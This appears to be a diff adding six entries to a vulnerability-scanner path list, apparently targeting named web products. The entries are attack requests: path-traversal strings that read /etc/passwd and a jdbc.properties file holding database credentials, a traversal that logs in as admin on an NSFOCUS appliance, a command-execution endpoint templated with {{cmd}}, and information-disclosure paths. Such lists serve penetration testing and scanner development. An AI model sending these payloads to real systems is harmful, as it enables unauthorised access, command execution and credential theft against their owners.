@@ -1,0 +1,6 @@
+/api/virtual/home/status?cat=../../../../../../../../../../../../../../usr/local/nsfocus/web/apache2/www/local_user.php&method=login&user_account=admin
+/webconf/Exec/index?cmd={{cmd}}
+/servlet/ShowImageServlet?imagePath=../web/fe.war/WEB-INF/classes/jdbc.properties&print
+/admin/weichatcfg/getsysteminfo
+/feed/ShowImage.do;.js.jsp?type=&imgName=../../../../../../../../../../../../../../../etc/passwd
+/cgi-bin/gateway/agentinfo
